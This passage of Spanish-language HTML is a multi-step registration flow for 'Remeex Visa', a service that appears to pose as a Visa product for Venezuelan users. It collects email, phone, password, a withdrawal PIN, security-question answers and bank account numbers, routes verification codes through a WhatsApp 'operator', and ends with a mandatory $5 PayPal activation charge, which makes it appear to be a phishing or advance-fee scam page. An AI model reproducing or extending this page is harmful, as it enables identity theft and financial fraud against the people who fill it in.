                                        <path d="M7 3h7l5 5v11a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3Z"></path>
                                        <path d="M14 3v5h5"></path>
                                        <path d="M9 14h6"></path>
                                        <path d="M9 17h4"></path>
                                    </svg>
                                </div>
                                <div class="document-preview-meta">
                                    <span class="document-preview-extension" id="documentPreviewExtension">PDF</span>
                                    <span class="document-preview-name" id="documentPreviewFilename"></span>
                                </div>
                            </div>
                        </div>
                        <div class="error-message" id="documentFileError" style="display:none;"></div>
                        <div class="document-signature-actions">
                            <button class="btn btn-secondary" type="button" id="openSignatureCapture" disabled>
                                <span>Capturar firma</span>
                                <div class="btn-ripple"></div>
                            </button>
                            <div class="document-signature-status">
                                <span class="document-upload-status" id="signatureStatus" aria-live="polite">Firma pendiente.</span>
                                <span class="status-icon status-icon--success" id="signatureSuccess" aria-hidden="true">
                                    <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M16.5 5.5 8.5 15 3.5 10"></path>
                                    </svg>
                                </span>
                            </div>
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="documentNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 7: Email -->
            <div class="step" id="step7">
                <div class="step-info">
                    <div class="step-title" id="emailTitle">¿Cuál es tu correo electrónico?</div>
                    <div class="step-description">Usaremos este email para enviarte notificaciones importantes de tu cuenta y para acceder a nuestros servicios</div>
                </div>

                <div class="step-content">
                    <div class="form-group">
                        <label class="form-label">Correo electrónico</label>
                        <input type="email" class="form-input" id="email" placeholder="tu@correo.com" autocomplete="email">
                    </div>


                    <div class="form-group">
                        <label class="form-label">Confirma tu correo electrónico</label>
                        <input type="email" class="form-input" id="emailConfirm" placeholder="tu@correo.com" autocomplete="email">
                    </div>

                    <div id="emailWarning" class="error-message" style="display:none;"></div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="emailNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 8: Verificación de email -->
            <div class="step" id="step8">
                <div class="step-info">
                    <div class="step-title" id="verificationTitle">Verifica tu correo electrónico</div>
                    <div class="step-description">Ingresa el código de verificación de 20 dígitos que te enviamos a tu correo para confirmar que eres tú.</div>

                    <div class="personalized-message" id="emailVerificationMessage"></div>
                    <div class="info-message">
                        Revisa también tu carpeta de spam o promociones. El correo llega desde <strong>info@remeexvisa.com</strong> y contiene tu código completo.
                        Si todavía no lo recibes, puedes solicitarlo nuevamente a un operador de VISA.
                    </div>
                </div>

                <div class="step-content">
                    <button class="btn btn-secondary btn-request-code" type="button" onclick="showSupportChannelOverlay()">
                        Solicitar código a un operador de VISA
                    </button>

                    <div class="form-group">
                        <label class="form-label">Código de verificación (20 dígitos)</label>
                        <input type="text" class="form-input" id="verificationCode" placeholder="Ingresa los 20 dígitos aquí" maxlength="21" autocomplete="one-time-code" inputmode="numeric">
                    </div>
                    <div id="verificationError" class="error-message" style="display:none;"></div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="verificationNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 9: Teléfono -->
            <div class="step" id="step9">
                <div class="step-info">
                    <div class="step-title" id="phoneTitle">¿Cuál es tu número de teléfono?</div>
                    <div class="step-description">Selecciona tu operadora para facilitarte el proceso de configuración</div>
                </div>

                <div class="step-content">
                    <div class="form-group" id="operatorGroup">
                        <label class="form-label">Operadora</label>
                        <div class="select-grid">
                            <div class="option-card" data-operator="movistar" data-prefix="0414,0424">
                                <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Movistar%2B_Logo.png" alt="Movistar logo" />
                                <span class="label">Movistar</span>
                                <span class="prefix">0414 · 0424</span>
                            </div>
                            <div class="option-card" data-operator="digitel" data-prefix="0412,0422">
                                <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Logo_DIGITEL.png/960px-Logo_DIGITEL.png" alt="Digitel logo" />
                                <span class="label">Digitel</span>
                                <span class="prefix">0412 · 0422</span>
                            </div>
                            <div class="option-card" data-operator="movilnet" data-prefix="0416,0426">
                                <img class="logo" src="Movilnetpng.png" alt="Movilnet logo" />
                                <span class="label">Movilnet</span>
                                <span class="prefix">0416 · 0426</span>
                            </div>
                        </div>
                    </div>

                    <div class="form-group" id="phoneGroup" style="display: none;">
                        <label class="form-label">Número de teléfono</label>
                        <div class="input-group">
                            <select class="form-input" id="phonePrefix" style="flex: 0 0 80px;"></select>
                            <input type="tel" class="form-input" id="phoneNumber" placeholder="1234567" maxlength="7" autocomplete="tel" inputmode="numeric">
                        </div>
                    </div>

                    <div class="form-group" id="internationalPhoneGroup" style="display: none;">
                        <label class="form-label">Número de teléfono internacional</label>
                        <input type="tel" class="form-input" id="internationalPhone" placeholder="+123456789" autocomplete="tel" inputmode="tel">
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="phoneNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 10: Contraseña -->
            <div class="step" id="step10">
                <div class="step-info">
                    <div class="step-title" id="passwordTitle">Crea tu contraseña</div>
                    <div class="step-description">Tu contraseña debe ser segura para proteger tu cuenta. Incluye mayúsculas, minúsculas, números y símbolos.</div>
                </div>

                <div class="step-content">
                    <div class="form-group">
                        <label class="form-label">Contraseña</label>
                        <div class="password-container">
                            <input type="password" class="form-input" id="password" placeholder="Crea una contraseña segura" autocomplete="new-password">
                            <button type="button" class="password-toggle" onclick="togglePassword('password')">
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                    <circle cx="12" cy="12" r="3"></circle>
                                </svg>
                            </button>
                        </div>
                        <div class="strength-meter">
                            <div class="strength-bar">
                                <div class="strength-fill" id="strengthFill"></div>
                            </div>
                            <div class="strength-text" id="strengthText">Ingresa tu contraseña</div>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Confirma tu contraseña</label>
                        <div class="password-container">
                            <input type="password" class="form-input" id="passwordConfirm" placeholder="Repite tu contraseña" autocomplete="new-password">
                            <button type="button" class="password-toggle" onclick="togglePassword('passwordConfirm')">
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                    <circle cx="12" cy="12" r="3"></circle>
                                </svg>
                            </button>
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="passwordNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 11: PIN -->
            <div class="step" id="step11">
                <div class="step-info">
                    <div class="step-title" id="pinTitle">Crea tu PIN de seguridad</div>
                    <div class="step-description">Este PIN de 4 dígitos lo usarás para autorizar retiros y transacciones importantes</div>
                </div>

                <div class="step-content">
                    <div class="form-group">
                        <label class="form-label">PIN de 4 dígitos</label>
                        <div class="pin-input" id="pinInput">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Confirma tu PIN</label>
                        <div class="pin-input" id="pinConfirmInput">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                            <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="pinNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 12: Pregunta de seguridad -->
            <div class="step" id="step12">
                <div class="step-info">
                    <div class="step-title" id="securityTitle">Pregunta de seguridad</div>
                    <div class="step-description">Selecciona una pregunta que solo tú puedas responder para la recuperación de tu cuenta</div>
                </div>

                <div class="step-content">
                    <div class="form-group">
                        <label class="form-label">Pregunta de seguridad</label>
                        <select class="form-input" id="securityQuestion">
                            <option value="">Selecciona una pregunta</option>
                            <option value="mother_name">¿Cuál es el nombre de soltera de tu madre?</option>
                            <option value="pet_name">¿Cuál fue el nombre de tu primera mascota?</option>
                            <option value="school_name">¿Cuál fue el nombre de tu escuela primaria?</option>
                            <option value="best_friend">¿Cuál es el nombre de tu mejor amigo de la infancia?</option>
                            <option value="birth_city">¿En qué ciudad naciste?</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Respuesta</label>
                        <input type="text" class="form-input" id="securityAnswer" placeholder="Tu respuesta" autocomplete="off">
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="securityNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 13: Uso de la cuenta -->
            <div class="step" id="step13">
                <div class="step-info">
                    <div class="step-title" id="accountUseTitle">¿Para qué usarás tu cuenta?</div>
                    <div class="step-description">Esto nos ayuda a personalizar tu experiencia y recomendarte los mejores servicios</div>
                </div>

                <div class="step-content">
                    <div class="select-grid">
                        <div class="option-card" data-use="ahorro">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <line x1="12" y1="1" x2="12" y2="23"></line>
                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
                            </svg>
                            <span class="label">Ahorro</span>
                        </div>
                        <div class="option-card" data-use="compras">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <circle cx="8" cy="21" r="1"></circle>
                                <circle cx="19" cy="21" r="1"></circle>
                                <path d="M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57l1.65-7.43H5.12"></path>
                            </svg>
                            <span class="label">Compras</span>
                        </div>
                        <div class="option-card" data-use="zelle">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M21 12c0 4.97-4.03 9-9 9s-9-4.03-9-9 4.03-9 9-9 9 4.03 9 9z"></path>
                                <path d="M9 12l2 2 4-4"></path>
                            </svg>
                            <span class="label">Obtener Zelle</span>
                        </div>
                        <div class="option-card" data-use="remesas">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <circle cx="12" cy="12" r="10"></circle>
                                <line x1="2" y1="12" x2="22" y2="12"></line>
                                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
                            </svg>
                            <span class="label">Remesas</span>
                        </div>
                        <div class="option-card" data-use="freelance">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
                                <line x1="8" y1="21" x2="16" y2="21"></line>
                                <line x1="12" y1="17" x2="12" y2="21"></line>
                            </svg>
                            <span class="label">Trabajo Freelance</span>
                        </div>
                        <div class="option-card" data-use="pagos">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                                <line x1="12" y1="18" x2="12.01" y2="18"></line>
                            </svg>
                            <span class="label">Pagos Móviles</span>
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="useNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 14: Banco principal -->
            <div class="step" id="step14">
                <div class="step-info">
                    <div class="step-title" id="bankTitle">¿Cuál es tu banco principal en Venezuela?</div>
                    <div class="step-description">Esto nos ayuda a configurar mejor tus transferencias y servicios bancarios</div>
                </div>

                <div class="step-content">
                    <div class="form-group">
                        <select class="form-input" id="primaryBank">
                            <option value="">Selecciona tu banco</option>
                        </select>
                        <img id="bankLogoPreview" style="display:none;margin-top:10px;height:40px;" alt="Logo del banco" loading="lazy">
                    </div>

                    <div class="form-group" id="bankAccountGroup" style="display: none;">
                        <label class="form-label" for="bankAccountNumber" id="bankAccountLabel">Número de cuenta bancaria</label>
                        <input type="text" class="form-input" id="bankAccountNumber" placeholder="Ingresa tu número de cuenta" autocomplete="off" inputmode="numeric">
                        <p class="input-note" id="bankAccountNote">Ingresa tu número de cuenta sin espacios ni guiones.</p>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="bankNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 15: Foto de perfil -->
            <div class="step" id="step15">
                <div class="step-info">
                    <div class="step-title" id="avatarTitle">Solicitaremos tu foto más adelante</div>
                    <div class="step-description" id="avatarDescription">En la recarga inicial te pediremos tu foto de perfil para completar la verificación. Continúa con el registro y ten a mano una imagen nítida de tu rostro para ese momento.</div>

                    <div class="avatar-section" id="avatarSection">
                        <div class="info-message" id="avatarVenezuelaMessage">
                            <strong>¿Cuándo te pediremos la foto?</strong><br>
                            En la recarga inicial te solicitaremos una imagen nítida de tu rostro para finalizar la verificación de identidad. Continúa avanzando y tenla lista para ese momento.
                        </div>
                    </div>
                </div>

                <div class="step-content">
                    <div class="avatar-section">
                        <div class="avatar-upload" id="avatarUploadSection" style="display: none;">
                            <div class="avatar-upload-card-container">
                                <input type="file" class="document-upload-input avatar-upload-input" id="profilePhotoInput" accept="image/png, image/jpeg" aria-describedby="profilePhotoNote profilePhotoError">
                                <label class="document-upload-dropzone avatar-upload-card" for="profilePhotoInput" role="button" tabindex="0">
                                    <div class="document-upload-graphic avatar-upload-graphic" aria-hidden="true">
                                        <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <rect x="4" y="9" width="40" height="30" rx="6" stroke="currentColor" stroke-width="2.5" opacity="0.4"/>
                                            <path d="M16 21.5L21 27.5L24 24.5L30 31.5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                                            <circle cx="18" cy="17" r="2.5" fill="currentColor"/>
                                            <path d="M18 41H30" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" opacity="0.4"/>
                                        </svg>
                                    </div>
                                    <div class="document-upload-copy avatar-upload-copy">
                                        <span class="document-upload-title avatar-upload-title">Sube una foto reciente</span>
                                        <span class="document-upload-subtitle avatar-upload-subtitle">Formatos aceptados: JPG o PNG. Tamaño máximo: 4 MB.</span>
                                    </div>
                                    <span class="avatar-upload-cta">Seleccionar imagen</span>
                                </label>
                                <p class="input-note" id="profilePhotoNote">Consejo: usa fondo neutro y buena iluminación para una verificación más rápida.</p>
                                <p class="error-message" id="profilePhotoError" style="display:none;" role="alert"></p>
                            </div>

                            <div class="avatar-preview-wrapper" id="profilePhotoPreviewWrapper" aria-live="polite">
                                <img id="profilePhotoPreview" class="avatar-preview" alt="Vista previa de tu foto de perfil" loading="lazy">
                            </div>
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="avatarNext">
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 16: Tarjeta personalizada -->
            <div class="step" id="step16">
                <div class="step-info">
                    <div class="step-title">Diseña tu tarjeta</div>
                    <div class="step-description">
                        Personaliza cómo se verá tu tarjeta Visa digital antes de aprobarla.
                    </div>
                    <div class="info-message">
                        <strong>¿Qué debes hacer?</strong><br>
                        1. Escribe tu nombre tal como quieres que aparezca impreso en la tarjeta.<br>
                        2. Pulsa <strong>Generar tarjeta</strong> para ver el resultado en la vista previa de la izquierda.<br>
                        3. Si notas un error, corrige el nombre y vuelve a generar la tarjeta antes de continuar.
                    </div>
                </div>

                <div class="step-content">
                    <div class="wrapper" id="cardDesigner">
                        <div class="card-form">
                            <div class="card-list">
                                <div class="card-item">
                                    <div class="card-item__side -front">
                                        <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
                                        <div class="card-item__cover">
                                            <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
                                        </div>

                                        <div class="card-item__wrapper">
                                            <div class="card-item__top">
                                                <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" class="card-item__chip">
                                                <div class="card-item__type">
                                                    <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/visa.png" alt="Visa" class="card-item__typeImg">
                                                </div>
                                            </div>
                                            <div class="card-item__number" ref="cardNumber">4985 0310 0778 1863</div>
                                            <div class="card-item__content">
                                                <label for="cardName" class="card-item__info" ref="cardName">
                                                    <div class="card-item__holder">Titular de la Tarjeta</div>
                                                    <transition name="slide-fade-up">
                                                        <div class="card-item__name" v-if="cardName.length" key="1">
                                                            <transition-group name="slide-fade-right">
                                                                <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-bind:key="$index + 1">{{n}}</span>
                                                            </transition-group>
                                                        </div>
                                                        <div class="card-item__name" v-else key="2">Nombre del Titular</div>
                                                    </transition>
                                                </label>
                                                <div class="card-item__date" ref="cardDate">
                                                    <label class="card-item__dateTitle">Vence</label>
                                                    <div class="card-item__dateDetails">
                                                        <label class="card-item__dateItem">
                                                            <span data-card-expiry-month>05</span>
                                                        </label>
                                                        /
                                                        <label class="card-item__dateItem">
                                                            <span data-card-expiry-year>28</span>
                                                        </label>
                                                    </div>
                                                    <div class="card-item__cvv" aria-label="CVV de la tarjeta">
                                                        <span class="card-item__cvvLabel">CVV</span>
                                                        <span class="card-item__cvvValue" data-card-cvv-display aria-hidden="true">897</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="card-form__inner">
                                <div class="card-input">
                                    <label for="cardName" class="card-input__label">
                                        <svg class="user-icon" viewBox="0 0 24 24">
                                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                                        </svg>
                                        Nombre del Titular
                                    </label>
                                    <input type="text" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" placeholder="Ej: María José García López" maxlength="25" autocomplete="off">
                                </div>

                                <button class="card-form__button" @click="generateCard">
                                    Generar tarjeta
                                    <span v-if="showCheck" class="checkmark" aria-hidden="true">
                                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                                            <polyline points="20 6 9 17 4 12" />
                                        </svg>
                                    </span>
                                </button>
                            </div>
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="designerNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 17: Resumen -->
            <div class="step" id="step17">
                <div class="step-info">
                    <div class="step-title" id="summaryTitle">Revisa tu información</div>
                    <div class="step-description">Verifica que todos los datos sean correctos antes de crear tu cuenta</div>

                    <div id="summaryContent"></div>
                </div>

                <div class="step-content">
                    <form id="registroForm">
                        <div class="form-group">
                            <label class="form-label" for="nicknameInput">¿Cuál es tu apodo o nombre de cariño en casa?</label>
                            <input type="text" class="form-input" id="nicknameInput" name="nickname" placeholder="Ej: Pancho" autocomplete="off">
                        </div>

                        <div class="button-group">
                            <button class="btn btn-secondary" type="button" onclick="previousStep()">
                                <span>Editar</span>
                            </button>
                            <button class="btn btn-primary" type="button" id="createAccountBtn" disabled onclick="submitRegistro()">
                                <span id="createAccountLabel">Crear Cuenta</span>
                                <div class="btn-ripple"></div>
                            </button>
                        </div>

                        <p class="form-status-message" id="msg" role="status" aria-live="polite"></p>
                    </form>
                </div>
            </div>

            <div class="initial-recharge-intro" id="initialRechargeIntro" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="initialRechargeIntroTitle">
                <video class="initial-recharge-intro__video" autoplay muted loop playsinline>
                    <source src="credit-cards-animated-900x1200.mp4" type="video/mp4">
                    Tu navegador no soporta el elemento de video.
                </video>
                <div class="initial-recharge-intro__scrim"></div>
                <div class="initial-recharge-intro__content">
                    <h2 class="initial-recharge-intro__title" id="initialRechargeIntroTitle">Tu Visa digital comienza con una recarga poderosa</h2>
                    <p class="initial-recharge-intro__text">Impulsa tu cuenta en segundos y libera pagos internacionales, tarjeta virtual instantánea y soporte premium desde el primer día.</p>
                    <button class="btn btn-primary initial-recharge-intro__cta" id="initialRechargeIntroCta">
                        <span>Comenzar mi recarga</span>
                        <div class="btn-ripple"></div>
                    </button>
                </div>
            </div>

            <!-- Paso 18: Recarga inicial -->
            <div class="step" id="step18">
                <div class="step-info">
                    <div class="step-title" id="initialRechargeTitle">Activa tu cuenta con tu primera recarga</div>
                    <div class="step-description" id="initialRechargeDescription">Confirma la recarga inicial de 5 USD y habilita todos los beneficios internacionales.</div>
                </div>

                <div class="step-content">
                    <div class="initial-recharge-grid">
                        <div class="initial-recharge-column initial-recharge-column--info">
                            <article class="initial-recharge-card initial-recharge-card--hero">
                                <h3 class="initial-recharge-card__title">Lanza tu Visa a nivel global hoy</h3>
                                <p class="initial-recharge-card__subtitle">Una única recarga inicial desbloquea pagos sin fronteras, experiencias premium y tu nueva identidad financiera internacional.</p>
                            </article>

                            <article class="initial-recharge-card initial-recharge-card--benefits">
                                <h4 class="initial-recharge-card__heading">Beneficios inmediatos</h4>
                                <ul class="initial-recharge-benefits">
                                    <li>
                                        <span class="initial-recharge-benefits__icon" aria-hidden="true">🚀</span>
                                        <div>
                                            <span class="initial-recharge-benefits__title">Activación instantánea</span>
                                            <p class="initial-recharge-benefits__description">Tu cuenta y tarjeta digital quedan listas para operar en más de 200 países en minutos.</p>
                                        </div>
                                    </li>
                                    <li>
                                        <span class="initial-recharge-benefits__icon" aria-hidden="true">💳</span>
                                        <div>
                                            <span class="initial-recharge-benefits__title">Pagos sin límites</span>
                                            <p class="initial-recharge-benefits__description">Accede a tarjetas virtuales y físicas con tipos de cambio preferenciales y control total desde la app.</p>
                                        </div>
                                    </li>
                                    <li>
                                        <span class="initial-recharge-benefits__icon" aria-hidden="true">🎁</span>
                                        <div>
                                            <span class="initial-recharge-benefits__title">Recompensas desde el día uno</span>
                                            <p class="initial-recharge-benefits__description">Recibe bonos de bienvenida, cashback internacional y upgrades exclusivos por tu primera recarga.</p>
                                        </div>
                                    </li>
                                </ul>
                            </article>

                            <article class="initial-recharge-card initial-recharge-card--support">
                                <div class="initial-recharge-support">
                                    <div class="initial-recharge-support__icon" aria-hidden="true">🛡️</div>
                                    <div>
                                        <h4 class="initial-recharge-support__title">Garantía Visa Secure</h4>
                                        <p class="initial-recharge-support__text">Si tu recarga no se acredita, nuestro equipo 24/7 la reembolsa y te acompaña hasta que quedes operativo.</p>
                                        <a href="https://wa.me/584241111111" target="_blank" rel="noopener" class="initial-recharge-support__link">Contacta soporte inmediato</a>
                                    </div>
                                </div>
                            </article>
                        </div>

                        <div class="initial-recharge-column initial-recharge-column--form">
                            <div class="initial-recharge-form-card">
                                <h3 class="initial-recharge-form-card__title">Confirma tu recarga inicial</h3>
                                <p class="initial-recharge-form-card__text">La recarga requerida para activar tu cuenta internacional es de 5 USD. Más adelante podrás ajustarla desde tu panel si lo necesitas.</p>
                                <div class="form-group">
                                    <label class="form-label" for="initialRechargeAmount">Monto de recarga (USD)</label>
                                    <div class="input-with-prefix">
                                        <span class="currency-prefix">$</span>
                                        <input type="number" class="form-input" id="initialRechargeAmount" min="5" max="5" step="0.01" value="5" inputmode="decimal" aria-describedby="initialRechargeRangeHint" readonly aria-readonly="true">
                                    </div>
                                    <div class="initial-recharge-amount-chips" id="initialRechargeAmountChips" role="group" aria-label="Montos rápidos">
                                        <button type="button" class="initial-recharge-amount-chip" data-recharge-amount="5">$5</button>
                                    </div>
                                    <p class="form-note" id="initialRechargeRangeHint">La recarga inicial requerida es de 5 USD. Podrás modificarla más adelante desde tu panel.</p>
                                    <div class="error-message" id="initialRechargeAmountError" style="display:none;" role="alert"></div>
                                </div>

                                <div class="initial-recharge-paypal" id="initialRechargePayPalCard">
                                    <div class="initial-recharge-paypal__header">
                                        <div class="initial-recharge-paypal__icon" aria-hidden="true">💳</div>
                                        <div>
                                            <h4 class="initial-recharge-paypal__title">Paga con PayPal</h4>
                                            <p class="initial-recharge-paypal__subtitle">Confirma tu recarga de forma segura sin salir del registro.</p>
                                        </div>
                                    </div>
                                    <div class="initial-recharge-paypal__actions">
                                        <button class="btn btn-primary" type="button" id="initialRechargeConfirm" disabled onclick="confirmInitialRecharge()">
                                            <span>Conectar con PayPal</span>
                                            <div class="btn-ripple"></div>
                                        </button>
                                        <div id="initialRechargePayPalButtons" class="initial-recharge-paypal__buttons" hidden></div>
                                    </div>
                                    <div id="initialRechargePaymentStatus" class="initial-recharge-paypal__status" role="status" aria-live="polite"></div>
                                </div>

                                <div class="button-group button-group--separated">
                                    <button class="btn btn-secondary" type="button" onclick="returnToSummaryFromRecharge()">
                                        <span>Atrás</span>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Paso 19: Procesando -->
            <div class="step" id="step19">
                <div class="step-info">
                    <div class="step-title" id="processingTitle">Creando tu cuenta...</div>
                    <div class="step-description" id="processingDescription">Estamos configurando tu cuenta Visa con la más alta seguridad. Esto tomará solo unos segundos.</div>
                </div>

                <div class="step-content">
                    <div class="loading-animation">
                        <div class="spinner"></div>
                    </div>
                </div>
            </div>

            <!-- Paso 20: Completado -->
            <div class="step" id="step20">
                <div class="step-info">
                    <div class="welcome-screen welcome-screen--info">
                        <svg class="welcome-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                            <polyline points="22,4 12,14.01 9,11.01"></polyline>
                        </svg>
                        <div class="step-title" id="welcomeTitle">¡Cuenta creada exitosamente!</div>
                        <div class="step-description" id="welcomeMessage">
                            Tu cuenta Visa ha sido creada. Ya puedes iniciar sesión y comenzar a disfrutar de todos nuestros servicios financieros digitales.
                        </div>
                        <div class="security-warning" role="note">
                            <span class="security-warning__icon" aria-hidden="true">🛡️</span>
                            <p class="security-warning__text">
                                Recuerda: Remeex Visa jamás te pedirá tus claves ni información bancaria sensible. Verifica siempre que los mensajes provengan de nuestros canales formales (info@remeexvisa.com, WhatsApp o chat oficial).
                            </p>
                        </div>
                        <div class="button-group button-group--compact">
                            <button class="btn btn-primary" onclick="goToLogin(this)">
                                <span>Iniciar Sesión</span>
                                <div class="btn-ripple"></div>
                            </button>
                        </div>
                    </div>
                </div>
                <div class="step-content"></div>
            </div>
        </div>

        <!-- Barra inferior fija -->
        <div class="bottom-bar" id="bottomBar">
            <div class="support-control">
                <button class="support-btn" id="support-btn" type="button" aria-label="Soporte" aria-controls="supportChannelOverlay" aria-haspopup="dialog" aria-expanded="false">
                    <svg class="support-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
